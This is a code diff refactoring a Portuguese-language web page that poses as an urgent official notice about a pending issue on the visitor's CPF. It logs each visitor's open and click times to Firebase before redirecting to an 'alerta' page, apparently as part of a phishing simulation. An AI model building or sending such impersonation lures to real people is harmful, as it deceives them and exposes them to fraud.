@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Notificação Oficial</title>
-
   <style>
     body {
       margin: 0;
@@ -15,7 +14,6 @@
       align-items: center;
       height: 100vh;
     }
-
     .container {
       width: 90%;
       max-width: 400px;
@@ -25,23 +23,19 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
     }
-
     h1 {
       font-size: 20px;
       color: #c40000;
     }
-
     p {
       font-size: 16px;
       color: #333;
     }
-
     .alert {
       font-weight: bold;
       color: #c40000;
       margin: 15px 0;
     }
-
     button {
       width: 100%;
       padding: 15px;
@@ -52,11 +46,9 @@
       border-radius: 8px;
       cursor: pointer;
     }
-
     button:hover {
       background-color: #218838;
     }
-
     .footer {
       margin-top: 15px;
       font-size: 12px;
@@ -64,25 +56,13 @@
     }
   </style>
 </head>
-
 <body>
-
   <div class="container">
     <h1>⚠️ Notificação Urgente</h1>
-
-    <p>
-      Identificamos uma pendência vinculada ao seu CPF junto ao sistema nacional.
-    </p>
-
-    <p class="alert">
-      Regularize agora e evite restrições no seu nome.
-    </p>
-
-    <button onclick="continuar()">CLIQUE AQUI PARA RESOLVER</button>
-
-    <div class="footer">
-      Atendimento disponível por tempo limitado.
-    </div>
+    <p>Identificamos uma pendência vinculada ao seu CPF junto ao sistema nacional.</p>
+    <p class="alert">Regularize agora e evite restrições no seu nome.</p>
+    <button id="btn-resolver">CLIQUE AQUI PARA RESOLVER</button>
+    <div class="footer">Atendimento disponível por tempo limitado.</div>
   </div>
 
   <script type="module">
@@ -109,22 +89,27 @@
 
     const inicio = Date.now();
 
-    await setDoc(doc(db, "visitas", userId), {
-      abertura: inicio
-    });
-
-    window.continuar = async function() {
-      const tempoClique = Date.now();
-
+    try {
       await setDoc(doc(db, "visitas", userId), {
-        clique: tempoClique
+        abertura: inicio
       }, { merge: true });
+    } catch (error) {
+      console.error(error);
+    }
 
-      window.location.href = "alerta.html";
-    };
+    document.getElementById("btn-resolver").addEventListener("click", async () => {
+      const tempoClique = Date.now();
+      
+      try {
+        await setDoc(doc(db, "visitas", userId), {
+          clique: tempoClique
+        }, { merge: true });
+      } catch (error) {
+        console.error(error);
+      } finally {
+        window.location.href = "alerta.html";
+      }
+    });
   </script>
-<script>
-  console.log("TESTE FUNCIONANDO");
-</script>
 </body>
 </html>
